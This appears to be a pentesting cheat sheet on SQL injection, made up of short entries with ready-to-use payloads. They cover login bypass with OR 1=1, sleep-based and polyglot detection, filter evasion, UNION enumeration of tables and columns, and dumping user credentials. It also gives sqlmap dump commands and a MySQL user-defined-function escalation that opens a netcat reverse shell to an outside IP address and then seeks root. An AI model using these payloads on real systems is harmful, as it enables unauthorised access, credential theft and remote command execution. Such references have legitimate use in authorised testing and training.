

<!--- category: sqli --->
<!--- id: intro --->
<!--- title: SQLi --->
<!--- keywords:  --->
## SQLi




<!--- category: sqli --->
<!--- id: principe --->
<!--- title: Principle --->
<!--- keywords:  --->
## Principle

Inject SQL commands in the parameters to rewrite the SQL query.
```
SELECT * FROM user WHERE login='[USER]' and password='[PASSWORD]';
```

Method : close the single quote ', whiden the SELECT with OR 1=1, add entries thanks to  UNION, comment the end of the request with # or -- -
```
Sent parameters:
USER=admin' OR 1=1 -- -
PASSWORD=ferrari

Altered SQL request:
SELECT * FROM user WHERE login='admin' OR 1=1 -- - and password='ferrari';
```

Send the Form with custom params thanks to curl:
```
curl http://target/login.pgp?login=admin' OR 1=1 -- -&password=ferrari
```




<!--- category: sqli --->
<!--- id: sqli-fun --->
<!--- title: Exploits of a mom --->
<!--- keywords:  --->
## Exploits of a mom

<img src='https://imgs.xkcd.com/comics/exploits_of_a_mom.png'> 



<!--- category: sqli --->
<!--- id: sql-mysql --->
<!--- title: MySQL/MariaDB - Commands --->
<!--- keywords:  --->
## MySQL/MariaDB - Commands

Connect to a remote mysql database:
```
mysql -u admin --host=10.10.12.10 : without password
mysql -u admin --host=10.10.12.10 -padmin : with password
```

Usefull commands:
```
SELECT @@version;
SELECT user();
SHOW Databases;
USE database;
SHOW tables;
SELECT * from table;
```




<!--- category: sqli --->
<!--- id: detect --->
<!--- title: Detect SQLi --->
<!--- keywords:  --->
## Detect SQLi

Inject single quote ' or double quote " and see an error.<br/>
Inject Sleep and detect a delayed response.
```
admin' and sleep(5) and '1'='1
admin" and sleep(5) and "1"="1
```




<!--- category: sqli --->
<!--- id: detect --->
<!--- title: Detect SQLi : Polyglot --->
<!--- keywords:  --->
## Detect SQLi : Polyglot

A polyglot is a sequence working for many different scenarios
```
a/*$(sleep 5)`sleep 5``*/sleep(5)#'/*$(sleep 5)`sleep 5` #*/||sleep(5)||'"||sleep(5)||"`
```




<!--- category: sqli --->
<!--- id: limit --->
<!--- title: Select only one entry --->
<!--- keywords:  --->
## Select only one entry

Usually developers take the first entry. But sometimes they check that there is only one.
```
admin' or 1=1 LIMIT 1 -- -
```




<!--- category: sqli --->
<!--- id: simplefilter --->
<!--- title: Bypass simple filters --->
<!--- keywords:  --->
## Bypass simple filters

Sometime, SQLi aware developpers filter characters such as space or words such as OR:
```
Space => Tab %09, Newline %A0, /**/
AND   => && %26%26
OR    => ||
```




<!--- category: sqli --->
<!--- id: union --->
<!--- title: Inject values using UNION --->
<!--- keywords:  --->
## Inject values using UNION

When the query is used to display entries (e.g. list of objects), values can be added with a UNION.<br/>.
First, you need to identify the number of entries used by SELECT:<br/>
```
SELECT id, name, desc, price FROM stock WHERE name=[NAME]
```

Methode 1: ORDER BY
```
SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 1-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 2-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 3-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 4-- - : Ok
SELECT id, name, desc, price FROM stock WHERE name='mouse' order by 5-- - : Error
=> 4 entries
```

Methode 2: SELECT
```
SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1 : Error
SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2 : Error
SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,3 : Error
SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,3,4 : Ok
=> 4 entries
```




<!--- category: sqli --->
<!--- id: uniontablenames --->
<!--- title: UNION: Table names --->
<!--- keywords:  --->
## UNION: Table names

```
SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,table_name,table_name FROM information_schema.tables; -- -  
```




<!--- category: sqli --->
<!--- id: uniontablecolumnnames --->
<!--- title: UNION: Table columns names --->
<!--- keywords:  --->
## UNION: Table columns names

```
SELECT id, name, desc, price FROM stock WHERE name='mouse' UNION SELECT 1,2,column_name,column_name FROM information_schema.columns WHERE  table_name='users'; -- -
```




<!--- category: sqli --->
<!--- id: uniontablecolumnnames --->
<!--- title: UNION: Dump table --->
<!--- keywords:  --->
## UNION: Dump table

```
UNION SELECT concat(name,':',pass),1 FROM users; -- -
```




<!--- category: sqli --->
<!--- id: sqlmap --->
<!--- title: SqlMap --->
<!--- keywords:  --->
## SqlMap

SQLi on GET parameter:
```
$ sqlmap -u 'http://10.10.10.129/sqli/example1.php?name=root' --dbs --banner
```

SQLi on POST parameter:<br/>
Intercept the request using Burp, and save it in login.txt file.
```
$ sqlmap -r login.txt --dbs --banner
  -p name : parameter to be tested
```
 
List tables, then dumper une table:
```
$ sqlmap -r login.txt -D jetadmin --tables
$ sqlmap -r login.txt -D jetadmin -T users --dump
```




<!--- category: sqli --->
<!--- id: mysqludf --->
<!--- title: MySQL: UDF User Defined Function --->
<!--- keywords:  --->
## MySQL: UDF User Defined Function

Compile a unix library containing the function sys_exec()<br/>
Uploader the .so file onto the server. Declare the function in MySQL. Now it's possible to use sys_exec() to run shell commands.
```
# Tested with : mysql 5.5.60-0+deb8u1
# Create a 'User Defined Function' calling C function 'system'
# Use pre-compiled 32 or 64 depending on target.
# Copy file to /tmp
create database exploittest;
use exploittest;
create table bob(line blob);
insert into bob values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from bob into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys.so
create function sys_exec returns int soname 'lib_mysqludf_sys.so';
select sys_exec('nc 11.0.0.21 4444 -e /bin/bash');

select sys_exec('/bin/sh');
after bash access, 'bash –p' or 'sudo su'
```


